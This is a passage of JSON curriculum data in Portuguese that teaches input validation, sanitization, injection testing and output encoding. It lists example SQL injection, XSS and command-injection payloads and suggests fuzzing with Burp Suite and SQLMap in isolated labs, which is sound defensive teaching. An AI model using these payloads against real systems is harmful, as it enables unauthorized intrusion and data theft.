                                    "Confundir com blacklist",
                                    "Achar que whitelist é 'menos flexível' sem contexto de segurança"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Definir Regras de Whitelist para Dados de Entrada",
                                  "subSteps": [
                                    "Escolha o tipo de dado: e-mail (lista de domínios), senha (regex para comprimento e caracteres), campo numérico (faixa permitida).",
                                    "Crie regex para senhas: ex. /^(?=.*[a-z])(?=.*[A-Z])(?=.*\\d)[a-zA-Z\\d@$!%*?&]{8,}$/.",
                                    "Liste domínios permitidos para e-mail: ['@empresa.com', '@parceiro.com'].",
                                    "Defina mensagem de erro padronizada para rejeições: 'Valor não autorizado'.",
                                    "Documente as regras em pseudocódigo."
                                  ],
                                  "verification": "Crie um documento com 3 regras de whitelist prontas para uso, incluindo regex testados em ferramenta online.",
                                  "estimatedTime": "25-35 minutos",
                                  "materials": [
                                    "Regex101.com ou similar",
                                    "Editor de texto"
                                  ],
                                  "tips": "Teste regex incrementalmente para evitar erros de escape.",
                                  "learningObjective": "Capacitar-se a criar regras precisas e seguras para diferentes tipos de input.",
                                  "commonMistakes": [
                                    "Regex muito permissivos",
                                    "Esquecer case-insensitivity em e-mails"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Validação Whitelist em JavaScript",
                                  "subSteps": [
                                    "Crie função validateEmailWhitelist(email): use .match() com regex de domínios.",
                                    "Implemente validatePassword(password): use .match() com regex de força.",
                                    "Crie função unificada isValidInput(fieldName, value, whitelistRule).",
                                    "Integre em form HTML: adicione event listener no submit para validar.",
                                    "Retorne true/false e log erros no console."
                                  ],
                                  "verification": "Execute código em console do navegador; teste 5 inputs válidos e 5 inválidos.",
                                  "estimatedTime": "30-45 minutos",
                                  "materials": [
                                    "Editor VS Code",
                                    "Navegador com console devtools"
                                  ],
                                  "tips": "Use const para whitelists para imutabilidade.",
                                  "learningObjective": "Desenvolver código JS funcional para validação whitelist em aplicações client-side.",
                                  "commonMistakes": [
                                    "Não sanitizar input antes",
                                    "Ignorar trimming de espaços"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar Validação Whitelist em PHP",
                                  "subSteps": [
                                    "Crie função validateEmailWhitelist($email): use preg_match com array de domínios.",
                                    "Implemente validatePassword($password): preg_match com regex de força.",
                                    "Use filter_var com FILTER_VALIDATE_EMAIL como base, mas override com whitelist.",
                                    "Crie handler de form POST: valide $_POST e redirecione com erros se falhar.",
                                    "Adicione logging de tentativas inválidas."
                                  ],
                                  "verification": "Configure servidor local (XAMPP), submeta form com testes; verifique logs.",
                                  "estimatedTime": "35-50 minutos",
                                  "materials": [
                                    "PHP 8+, XAMPP ou similar",
                                    "Editor com syntax highlight"
                                  ],
                                  "tips": "Sempre use prepared statements se conectando a DB após validação.",
                                  "learningObjective": "Implementar validação server-side robusta em PHP para produção.",
                                  "commonMistakes": [
                                    "Não escapar regex em PHP",
                                    "Permitir empty strings como válidas"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar e Integrar a Validação em uma Aplicação",
                                  "subSteps": [
                                    "Crie testes unitários: use Jest para JS, PHPUnit para PHP com casos edge.",
                                    "Teste fuzzing: inputs maliciosos como SQL injection, XSS payloads.",
                                    "Integre em app full-stack: JS client valida primeiro, PHP server dupla-checa.",
                                    "Monitore performance: meça tempo de validação em loops.",
                                    "Refatore código para reusabilidade em múltiplos forms."
                                  ],
                                  "verification": "Relatório de testes: 100% pass rate em 20 casos; app rejeita todos inválidos.",
                                  "estimatedTime": "40-60 minutos",
                                  "materials": [
                                    "Jest/PHPUnit",
                                    "Ferramentas de fuzzing como Burp Suite Community"
                                  ],
                                  "tips": "Defina taxa de falha aceitável <1% em testes automatizados.",
                                  "learningObjective": "Garantir robustez através de testes e integração prática.",
                                  "commonMistakes": [
                                    "Testar só casos felizes",
                                    "Ignorar performance em listas grandes"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um formulário de login de sistema corporativo, valide e-mail contra whitelist ['@minhaempresa.com', '@fornecedor.com'] usando regex /^[^@]+@(minhaempresa|fornecedor)\\.com$/i em JS/PHP, e senha com regex de 8+ chars incluindo maiúscula/minúscula/dígito. Rejeite 'hacker@evil.com' mas aceite 'user@minhaempresa.com'.",
                              "finalVerifications": [
                                "Explicar verbalmente por que whitelist previne 99% de ataques de injeção.",
                                "Implementar e demonstrar código JS/PHP validando 10 inputs mistos.",
                                "Identificar e corrigir bug em código fornecido com whitelist falha.",
                                "Criar nova regra para validar CEP brasileiro por lista de estados.",
                                "Discutir impacto em performance para 1M entradas/dia.",
                                "Documentar código com comentários OWASP-compliant."
                              ],
                              "assessmentCriteria": [
                                "Código aceita 100% de inputs válidos e rejeita 100% inválidos.",
                                "Regras de whitelist são precisas, eficientes e bem documentadas.",
                                "Implementação cobre client e server-side com dupla validação.",
                                "Testes incluem edge cases, fuzzing e performance.",
                                "Mensagens de erro são user-friendly e não expõem detalhes internos.",
                                "Código é modular, reutilizável e segue best practices (ex.: imutável)."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Construção e otimização de expressões regulares.",
                                "Segurança da Informação: Prevenção de OWASP Top 10 (A03 Injection).",
                                "Desenvolvimento de Software: Testes unitários e TDD.",
                                "Gestão de Projetos: Documentação de regras para equipes.",
                                "Ética em TI: Princípios de defense-in-depth."
                              ],
                              "realWorldApplication": "Em e-commerces como Amazon, validação whitelist de CPFs por estado ou categorias de produto permitidas previne fraudes e injeções SQL, protegendo milhões de transações diárias e garantindo conformidade com LGPD/GDPR."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.5.1.3",
                            "name": "Realizar sanitização no lado servidor",
                            "description": "Usar funções de escape e filtros no servidor (ex.: prepared statements para SQL, htmlspecialchars em PHP) para neutralizar caracteres maliciosos em entradas, garantindo defesa em profundidade.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender entradas de usuário e ameaças de injeção",
                                  "subSteps": [
                                    "Identifique todos os pontos de entrada de dados do usuário em uma aplicação web (ex.: $_POST, $_GET).",
                                    "Estude exemplos de ataques comuns como SQL Injection e XSS, focando em como caracteres maliciosos (ex.: '; DROP TABLE --) exploram falta de sanitização.",
                                    "Diferencie validação (verificar formato) de sanitização (neutralizar perigos).",
                                    "Liste vetores de ataque específicos para SQL e HTML output.",
                                    "Revise o conceito de 'defesa em profundidade' na segurança de aplicações."
                                  ],
                                  "verification": "Crie um diagrama simples de uma aplicação web marcando entradas e possíveis ataques, explicando como sanitização mitiga cada um.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Documentação OWASP sobre Injeção",
                                    "Editor de texto para diagramas",
                                    "Acesso a internet para exemplos de ataques"
                                  ],
                                  "tips": [
                                    "Sempre assuma que toda entrada é maliciosa até sanitizada.",
                                    "Use ferramentas como OWASP ZAP para visualizar ataques demo."
                                  ],
                                  "learningObjective": "Ao final deste passo, você será capaz de identificar e mapear todas as entradas de usuário e suas ameaças associadas em uma aplicação web.",
                                  "commonMistakes": [
                                    "Confundir sanitização com validação apenas.",
                                    "Ignorar entradas indiretas como headers HTTP.",
                                    "Subestimar ataques em massa via parâmetros GET."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar prepared statements para sanitização em banco de dados",
                                  "subSteps": [
                                    "Configure um ambiente local com PHP e MySQL (use XAMPP ou Docker).",
                                    "Escreva uma query SQL vulnerável que concatena input diretamente.",
                                    "Refatore para usar PDO com prepared statements e bind parameters.",
                                    "Teste inserindo dados maliciosos (ex.: ' OR 1=1 --) e verifique se a query executa corretamente sem injeção.",
                                    "Adicione error handling para exceções de banco."
                                  ],
                                  "verification": "Execute o script com input malicioso; confirme que apenas dados válidos são inseridos no banco sem alteração da query.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "PHP 8+ com PDO",
                                    "MySQL server local",
                                    "Editor como VS Code",
                                    "Banco de teste vazio"
                                  ],
                                  "tips": [
                                    "Use bindParam com tipos explícitos (PDO::PARAM_STR).",
                                    "Nunca escape manualmente para SQL; prepared statements fazem isso automaticamente."
                                  ],
                                  "learningObjective": "Ao final deste passo, você será capaz de refatorar queries SQL vulneráveis para prepared statements seguros.",
                                  "commonMistakes": [
                                    "Esquecer de bindar todos os parâmetros.",
                                    "Usar mysqli_real_escape_string em vez de prepared statements (menos seguro).",
                                    "Não testar com payloads reais de injeção."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Aplicar funções de escape para saída HTML e outros contextos",
                                  "subSteps": [
                                    "Recupere dados do banco usando a query sanitizada do passo anterior.",
                                    "Aplique htmlspecialchars() em PHP para escapar output HTML (ENT_QUOTES | ENT_HTML5).",
                                    "Teste com input contendo <script>alert('XSS')</script> e confirme que é exibido como texto plano.",
                                    "Explore escapes contextuais: json_encode para JSON, urlencode para URLs.",
                                    "Integre em um formulário completo: input -> DB -> output."
                                  ],
                                  "verification": "Insira script malicioso via form; verifique no browser source se está escapado e não executa.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Mesmo ambiente PHP/MySQL do passo 2",
                                    "Browser com DevTools",
                                    "Exemplos OWASP XSS Cheat Sheet"
                                  ],
                                  "tips": [
                                    "Escape no momento da saída, não na entrada.",
                                    "Defina charset UTF-8 em htmlspecialchars para suporte internacional."
                                  ],
                                  "learningObjective": "Ao final deste passo, você será capaz de neutralizar XSS escapando outputs em diferentes contextos web.",
                                  "commonMistakes": [
                                    "Escapar na entrada em vez de saída.",
                                    "Usar htmlentities em vez de htmlspecialchars (mais pesado).",
                                    "Esquecer ENT_QUOTES para aspas duplas/simples."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Testar integralmente e aplicar defesa em profundidade",
                                  "subSteps": [
                                    "Crie um app de teste completo: form de cadastro -> DB insert -> listagem.",
                                    "Use ferramentas como SQLMap ou Burp Suite para scan automatizado de vulnerabilidades.",
                                    "Adicione camadas extras: validação de formato + rate limiting.",
                                    "Registre logs de tentativas de injeção detectadas.",
                                    "Documente o código com comentários sobre sanitização aplicada."
                                  ],
                                  "verification": "Submeta payloads de OWASP Top 10; confirme zero vulnerabilidades em scans e testes manuais.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "SQLMap ou OWASP ZAP",
                                    "Burp Suite Community (opcional)",
                                    "Servidor local rodando o app"
                                  ],
                                  "tips": [
                                    "Automatize testes com scripts PHPUnit.",
                                    "Monitore erros de DB para detectar tentativas falhas."
                                  ],
                                  "learningObjective": "Ao final deste passo, você será capaz de integrar sanitização em apps reais com testes robustos e múltiplas defesas.",
                                  "commonMistakes": [
                                    "Testar só com dados benignos.",
                                    "Ignorar sanitização em APIs REST/JSON.",
                                    "Não versionar código para revisão."
                                  ]
                                }
                              ],
                              "practicalExample": "Desenvolva um sistema de comentários em PHP: usuário submete comentário via POST -> prepared statement insere no MySQL -> lista comentários escapados com htmlspecialchars(). Teste injetando <script>alert(1)</script>; deve aparecer como texto, não executar, e não vazar dados do DB.",
                              "finalVerifications": [
                                "Explique a diferença entre SQL Injection e XSS, e como sanitização server-side mitiga ambos.",
                                "Refatore um código vulnerável fornecido para seguro em <5 minutos.",
                                "Identifique 3 pontos de entrada em um app real e proponha sanitizações.",
                                "Demonstre um teste manual de injeção que falha devido à sanitização.",
                                "Liste funções de escape para 3 contextos (SQL, HTML, URL).",
                                "Descreva 'defesa em profundidade' com exemplos do seu código."
                              ],
                              "assessmentCriteria": [
                                "Todas as entradas usam prepared statements ou escapes apropriados (100% cobertura).",
                                "Testes com payloads maliciosos confirmam neutralização total.",
                                "Código inclui error handling e logging para segurança.",
                                "Documentação clara explica escolhas de sanitização.",
                                "Performance não degradada (>95% queries em <100ms).",
                                "Integração com validação client-side para UX, mas não depende dela."
                              ],
                              "crossCurricularConnections": [
                                "Matemática: Lógica proposicional em queries parametrizadas.",
                                "Ética e Direito: Conformidade com LGPD/GDPR via proteção de dados sensíveis.",
                                "Redes de Computadores: Entendimento de HTTP requests/responses e headers.",
                                "Desenvolvimento de Software: Boas práticas de clean code e testes unitários.",
                                "Administração: Gerenciamento de riscos em sistemas empresariais."
                              ],
                              "realWorldApplication": "Em plataformas e-commerce como Magazine Luiza, sanitização server-side previne SQL Injections que poderiam expor milhões de dados de cartões de crédito, evitando prejuízos financeiros e multas regulatórias, como visto em breaches da Equifax."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.5.1.4",
                            "name": "Testar validação contra vetores de ataque comuns",
                            "description": "Simular ataques de injeção com ferramentas como Burp Suite ou payloads manuais, verificando se a validação bloqueia SQL Injection e outros vetores em cenários reais.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o ambiente de teste seguro",
                                  "subSteps": [
                                    "Instale e configure uma ferramenta de interceptação como Burp Suite Community Edition.",
                                    "Prepare uma aplicação de teste vulnerável, como DVWA (Damn Vulnerable Web Application) ou uma app local com formulário de login.",
                                    "Configure proxy no navegador (ex: Firefox) para rotear tráfego através do Burp Suite.",
                                    "Verifique conectividade e capture tráfego inicial sem payloads maliciosos.",
                                    "Ative logging para registrar todas as requisições e respostas."
                                  ],
                                  "verification": "Confirme que o tráfego da app é interceptado corretamente no Burp Proxy sem erros de conexão.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Burp Suite, DVWA ou app de teste local (Docker/XAMPP), navegador com proxy configurado",
                                  "tips": "Use containers Docker para isolar o ambiente e evitar impactos em sistemas reais.",
                                  "learningObjective": "Entender a configuração de um laboratório de testes de segurança isolado.",
                                  "commonMistakes": "Esquecer de configurar o proxy no navegador, levando a tráfego não interceptado; usar apps de produção."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar e preparar vetores de ataque comuns",
                                  "subSteps": [
                                    "Liste vetores como SQL Injection (ex: ' OR 1=1 --), XSS (<script>alert(1)</script>), Command Injection (| ls).",
                                    "Pesquise payloads atualizados em OWASP Cheat Sheet ou PayloadsAllTheThings.",
                                    "Categorize por tipo de entrada: parâmetros GET/POST, headers, cookies.",
                                    "Crie uma tabela de payloads com variações evasivas (case variations, encoding).",
                                    "Teste payloads benignos primeiro para validar fluxo normal."
                                  ],
                                  "verification": "Tenha uma lista de 10+ payloads categorizados e prontos em um documento ou Burp Intruder.",
                                  "estimatedTime": "15 minutos",
                                  "materials": "OWASP resources, PayloadsAllTheThings GitHub, editor de texto ou Burp Repeater",
                                  "tips": "Comece com payloads clássicos antes de evoluir para evasões avançadas como double encoding.",
                                  "learningObjective": "Dominar a seleção de payloads representativos para testes de injeção.",
                                  "commonMistakes": "Usar payloads desatualizados que são bloqueados por defesas modernas; ignorar contexto da app."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Simular ataques e interceptar respostas",
                                  "subSteps": [
                                    "Intercepte uma requisição real (ex: login) no Burp Proxy e modifique com payload SQLi.",
                                    "Envie via Repeater e observe resposta: erros de DB, dumps de dados ou bloqueio.",
                                    "Repita para outros vetores, variando parâmetros e métodos HTTP.",
                                    "Use Burp Intruder para fuzzing automatizado com lista de payloads.",
                                    "Registre screenshots de requisições, respostas e comportamentos."
                                  ],
                                  "verification": "Todas payloads foram testadas com respostas capturadas mostrando bloqueio ou falha na validação.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Burp Suite (Proxy, Repeater, Intruder), app de teste ativa",
                                  "tips": "Ajuste o nível de agressividade no Intruder para evitar sobrecarga no target.",
                                  "learningObjective": "Executar simulações realistas de ataques e interpretar respostas.",
                                  "commonMistakes": "Não limpar payloads entre testes, causando falsos positivos; ignorar respostas 200 OK com payloads."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar resultados e verificar efetividade da validação",
                                  "subSteps": [
                                    "Compare respostas com e sem payloads: procure por sanitização (ex: erro genérico vs. SQL error).",
                                    "Teste bypasses potenciais como URL encoding ou case changes.",
                                    "Avalie cobertura: todos campos de entrada foram testados?",
                                    "Gere relatório com evidências: payloads bem-sucedidos vs. bloqueados.",
                                    "Recomende melhorias se validação falhar (ex: prepared statements)."
                                  ],
                                  "verification": "Relatório final lista vetores bloqueados e quaisquer vulnerabilidades encontradas.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Burp logs, screenshots, template de relatório (Markdown/Google Docs)",
                                  "tips": "Classifique severidade usando CVSS para priorizar issues.",
                                  "learningObjective": "Analisar evidências de testes para validar robustez da validação de entrada.",
                                  "commonMistakes": "Concluir sucesso sem testar variações evasivas; não documentar respostas exatas."
                                }
                              ],
                              "practicalExample": "Em um formulário de login PHP/MySQL sem validação, intercepte POST com payload ' OR '1'='1 em username. Sem validação, login succeeds sem senha; com validação (ex: mysqli_real_escape_string), retorna erro genérico 'Invalid credentials' sem dump de DB.",
                              "finalVerifications": [
                                "Todos vetores comuns (SQLi, XSS, Command Inj) foram testados em múltiplos campos de entrada.",
                                "Validação bloqueia 100% dos payloads sem expor erros internos do backend.",
                                "Respostas são consistentes e genéricas, sem vazamento de informações.",
                                "Fuzzing automatizado confirma ausência de bypasses simples.",
                                "Relatório inclui evidências visuais (screenshots/logs).",
                                "Ambiente de teste foi limpo e isolado."
                              ],
                              "assessmentCriteria": [
                                "Precisão na configuração do proxy e interceptação (sem erros de tráfego).",
                                "Completude da lista de payloads (cobertura de OWASP Top 10 injeções).",
                                "Qualidade da análise: distinção clara entre bloqueio efetivo e falhas.",
                                "Documentação detalhada com evidências reproduzíveis.",
                                "Identificação de pelo menos 3 variações evasivas testadas.",
                                "Tempo de execução dentro do estimado com eficiência."
                              ],
                              "crossCurricularConnections": [
                                "Programação: Implementação de prepared statements em SQL/PHP.",
                                "Redes: Entendimento de HTTP proxies e tráfego web.",
                                "Ética e Direito: Conformidade com leis de privacidade em testes de pen.",
                                "Análise de Dados: Interpretação de logs e padrões em respostas."
                              ],
                              "realWorldApplication": "Em equipes de DevSecOps, pentesters usam essa técnica para validar sanitização em apps web antes do deploy, prevenindo breaches como o Equifax SQLi de 2017, economizando milhões em remediações."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.5.5.2",
                        "name": "Codificação de Saída",
                        "description": "Transformação de dados de saída gerados dinamicamente para contextos específicos (HTML, JavaScript, CSS, URL), prevenindo Cross-Site Scripting (XSS) e outros ataques de interpretação maliciosa.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.5.2.1",
                            "name": "Entender contextos de codificação de saída",
                            "description": "Diferenciar contextos como HTML body, atributos HTML, JavaScript inline, JSON e URLs, e identificar quando cada um requer codificação específica para evitar execução de scripts.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o propósito da codificação de saída",
                                  "subSteps": [
                                    "Defina codificação de saída como o processo de transformar dados de entrada para que sejam seguros no contexto de saída.",
                                    "Explique o risco de Cross-Site Scripting (XSS) quando scripts não são codificados adequadamente.",
                                    "Liste os principais contextos de saída: HTML body, atributos HTML, JavaScript inline, JSON e URLs.",
                                    "Discuta como cada contexto interpreta caracteres de forma diferente, podendo executar código malicioso.",
                                    "Revise exemplos genéricos de payloads maliciosos como '<script>alert(1)</script>'."
                                  ],
                                  "verification": "Resuma em suas palavras o que é codificação de saída e liste os 5 contextos principais sem erros.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação OWASP sobre Output Encoding",
                                    "Vídeo introdutório sobre XSS (YouTube ou OWASP)"
                                  ],
                                  "tips": "Sempre pense 'onde o dado será inserido?' antes de escolher a codificação.",
                                  "learningObjective": "Entender o conceito fundamental e os riscos associados à falta de codificação.",
                                  "commonMistakes": [
                                    "Confundir codificação de saída com sanitização de entrada",
                                    "Ignorar que codificação varia por contexto"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Diferenciar contextos HTML: Body e Atributos",
                                  "subSteps": [
                                    "Para HTML body: Use HTML Entity Encoding (ex: &lt; para <).",
                                    "Teste um payload '<script>alert(1)</script>' em body sem codificação (executa) vs. codificado (mostra como texto).",
                                    "Para atributos HTML: Use HTML Attribute Encoding, escapando aspas e outros (ex: &quot; para \").",
                                    "Compare diferenças: Body permite tags, atributos precisam escapar delimitadores.",
                                    "Pratique com exemplos em um editor HTML simples."
                                  ],
                                  "verification": "Codifique corretamente um payload malicioso para body e para um atributo 'title' e demonstre em HTML.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Editor online como JSFiddle ou CodePen",
                                    "Tabela OWASP de Encoding por Contexto"
                                  ],
                                  "tips": "Lembre: Body quebra tags, atributos quebram valores delimitados por aspas.",
                                  "learningObjective": "Distinguir e aplicar codificações específicas para contextos HTML.",
                                  "commonMistakes": [
                                    "Usar a mesma codificação para body e atributos",
                                    "Esquecer de escapar & em atributos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar contextos JavaScript Inline e JSON",
                                  "subSteps": [
                                    "Para JavaScript inline: Use JavaScript String Escape (ex: \\x3c para <).",
                                    "Demonstre payload em <script>alert('</script><img src=x onerror=alert(1)>')</script>.",
                                    "Para JSON: Use JSON Encoding, escapando / e aspas adequadamente.",
                                    "Compare: JS inline permite quebra de strings, JSON é serialização segura se bem formada.",
                                    "Teste serialização JSON de input malicioso e insira em <script>var data = [input];</script>."
                                  ],
                                  "verification": "Codifique um payload para JS inline e JSON, inserindo em código funcional sem execução de script.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Console do navegador para testes JS",
                                    "Biblioteca como json_encode no PHP ou JSON.stringify no JS"
                                  ],
                                  "tips": "Valide JSON com parsers para evitar erros de serialização.",
                                  "learningObjective": "Identificar e codificar corretamente para contextos de dados dinâmicos em JS/JSON.",
                                  "commonMistakes": [
                                    "Não escapar barra invertida (\\) em JS",
                                    "Inserir JSON sem validação em JS"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar contextos URL e prática de identificação",
                                  "subSteps": [
                                    "Para URLs: Use URL Percent-Encoding (ex: %3C para <).",
                                    "Explique contextos como href, src ou query strings, onde decodificação pode levar a redirects/open redirects.",
                                    "Crie fluxograma para identificar contexto: 'É HTML? JS? URL?'.",
                                    "Pratique com 5 cenários mistos: Identifique contexto e escolha codificação.",
                                    "Integre com validação: Codificação não substitui validação de URL válida."
                                  ],
                                  "verification": "Dado um snippet de código, identifique todos os contextos de saída e especifique codificações corretas.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Lista de payloads XSS (OWASP)",
                                    "Ferramenta online de URL encoding como URL Encoder Decoder"
                                  ],
                                  "tips": "Sempre pergunte: 'O dado será interpretado como código ou dados?'",
                                  "learningObjective": "Dominar identificação de contextos URL e sintetizar conhecimento para qualquer saída.",
                                  "commonMistakes": [
                                    "Usar HTML encoding em URLs",
                                    "Ignorar contextos como data: URLs"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Prática integrada e revisão",
                                  "subSteps": [
                                    "Analise um código vulnerável completo (ex: forum post com user input em múltiplos contextos).",
                                    "Aplique codificações em todos os pontos identificados.",
                                    "Teste com payloads variados para verificar ausência de XSS.",
                                    "Documente regras pessoais para escolha de contexto.",
                                    "Discuta exceções como CSP (Content Security Policy) que mitiga mas não substitui encoding."
                                  ],
                                  "verification": "Corrija um código fornecido com múltiplos contextos, provando com testes que não há XSS.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Exemplo de app vulnerável como DVWA ou XSS playground",
                                    "Burp Suite Community para testes (opcional)"
                                  ],
                                  "tips": "Use bibliotecas como OWASP ESAPI ou encoder.js para automação.",
                                  "learningObjective": "Aplicar conhecimento de forma integrada em cenários reais.",
                                  "commonMistakes": [
                                    "Over-encoding (dupla codificação)",
                                    "Esquecer contextos aninhados"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um blog, user input 'nome' é exibido como: <p>Olá, [nome]!</p> <img src='/avatar/[nome]' title='[nome]'> <script>var user = '[nome]';</script> <a href='https://example.com/search?q=[nome]'>Buscar</a>. Sem encoding, '<script>alert(1)</script>' executa em body, quebra img title, quebra JS e redireciona URL. Com encodings corretos: HTML body para p, attribute para title/src, JS para script, URL para href.",
                              "finalVerifications": [
                                "Liste e descreva os 5 contextos principais sem erros.",
                                "Codifique corretamente 3 payloads diferentes para 3 contextos distintos.",
                                "Identifique contexto em 5 snippets de código fornecidos.",
                                "Explique diferença entre HTML body e atributo encoding.",
                                "Demonstre um teste XSS bem-sucedido sem encoding e falhado com encoding.",
                                "Crie fluxograma pessoal para escolha de encoding."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de contextos (100% correto).",
                                "Codificações aplicadas sem erros comuns como dupla encoding.",
                                "Explicações claras e contextualizadas.",
                                "Uso correto de exemplos práticos em testes.",
                                "Compreensão de riscos XSS em cenários reais.",
                                "Integração de conceitos em prática integrada."
                              ],
                              "crossCurricularConnections": [
                                "Programação Web: Integra com HTML/CSS/JS na Desenvolvimento de Aplicações.",
                                "Segurança da Informação: Conecta com validação de entrada e OWASP Top 10.",
                                "Lógica Computacional: Fluxogramas para decisão de contextos.",
                                "Banco de Dados: Encoding em queries parametrizadas vs. outputs."
                              ],
                              "realWorldApplication": "Em desenvolvimento de sites e apps web (ex: e-commerces, redes sociais), previne ataques XSS que roubam cookies/sessões, afetando milhões de usuários como no caso Twitter/XSS de 2010, garantindo conformidade com GDPR/ LGPD."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.5.2.2",
                            "name": "Aplicar encoders apropriados por contexto",
                            "description": "Implementar funções de codificação como encodeURIComponent para URLs, HTML entity encoding para HTML, e CES para JavaScript, com exemplos práticos em frameworks web como React ou Express.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar contextos de saída e encoders apropriados",
                                  "subSteps": [
                                    "Estude os principais contextos de saída: URL query parameters, HTML content, JavaScript strings e atributos HTML.",
                                    "Liste os encoders recomendados: encodeURIComponent para URLs, he.encode ou similar para HTML, JSON.stringify para JS strings.",
                                    "Analise exemplos de ataques como XSS causados por encoders errados (ex: usar encodeURIComponent em HTML).",
                                    "Crie uma tabela comparativa de contextos vs. encoders com cenários de uso.",
                                    "Revise OWASP guidelines para Output Encoding."
                                  ],
                                  "verification": "Tabela comparativa completa com pelo menos 5 contextos e encoders corretos, sem erros identificados.",
                                  "estimatedTime": "45 min",
                                  "materials": [
                                    "Documentação OWASP Cheat Sheet for Output Encoding",
                                    "Repositório GitHub com exemplos de XSS",
                                    "Editor de texto ou Markdown para tabela"
                                  ],
                                  "tips": "Sempre pergunte: 'Onde o dado será inserido?' antes de escolher o encoder.",
                                  "learningObjective": "Compreender quando e por que usar cada encoder para evitar injeções.",
                                  "commonMistakes": [
                                    "Confundir URL encoding com HTML encoding",
                                    "Usar escape genérico em todos os contextos",
                                    "Ignorar contexto de JavaScript dinâmico"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar encodeURIComponent para contextos de URL",
                                  "subSteps": [
                                    "Crie uma função wrapper para encodeURIComponent que valide input.",
                                    "Teste com caracteres especiais: espaços, &, =, # em query params.",
                                    "Integre em um fetch API ou link <a href> com user input.",
                                    "Verifique decodificação no servidor com decodeURIComponent.",
                                    "Teste casos edge: UTF-8 chars, long strings."
                                  ],
                                  "verification": "URLs geradas passam em validadores como URLParser sem erros e resistem a injeções.",
                                  "estimatedTime": "30 min",
                                  "materials": [
                                    "Node.js ou browser console",
                                    "Biblioteca URL do JS nativo",
                                    "Ferramenta online como URL Encoder Decoder"
                                  ],
                                  "tips": "Use encodeURIComponent, não encodeURI, para query params individuais.",
                                  "learningObjective": "Aplicar codificação URL corretamente em links e requests.",
                                  "commonMistakes": [
                                    "Usar encodeURI para params",
                                    "Não codificar após template literals",
                                    "Esquecer de codificar valores dinâmicos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar HTML entity encoding para conteúdo HTML",
                                  "subSteps": [
                                    "Instale e use biblioteca como 'he' (HTML Entities) no Node ou React.",
                                    "Codifique user input antes de inserir em innerHTML ou dangerouslySetInnerHTML.",
                                    "Teste com payloads XSS: <script>alert(1)</script>, &quot;, <img src=x onerror=alert(1)>.",
                                    "Compare com innerText vs. textContent para entender diferenças.",
                                    "Crie um componente React que renderiza user comments safely."
                                  ],
                                  "verification": "Payloads XSS são renderizados como texto plano, sem execução de scripts.",
                                  "estimatedTime": "40 min",
                                  "materials": [
                                    "npm para instalar 'he'",
                                    "React sandbox como CodeSandbox",
                                    "Burp Suite ou browser devtools para testar XSS"
                                  ],
                                  "tips": "Nunca use innerHTML sem encoding; prefira textContent quando possível.",
                                  "learningObjective": "Proteger HTML outputs contra XSS via entity encoding.",
                                  "commonMistakes": [
                                    "Usar encodeURIComponent para HTML",
                                    "Esquecer atributos como title ou alt",
                                    "Desabilitar encoding em prod"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar escaping para contextos JavaScript",
                                  "subSteps": [
                                    "Use JSON.stringify para strings em JS dinâmico (ex: eval ou new Function).",
                                    "Para CSS/JS contexts, use bibliotecas como encodeJS ou DOMPurify.",
                                    "Teste inserção em <script> tags ou event handlers.",
                                    "Em Express, escape res.send com JSON.stringify em templates.",
                                    "Verifique com payloads como '; alert(1);//'."
                                  ],
                                  "verification": "Código JS gerado não executa payloads maliciosos quando avaliado.",
                                  "estimatedTime": "35 min",
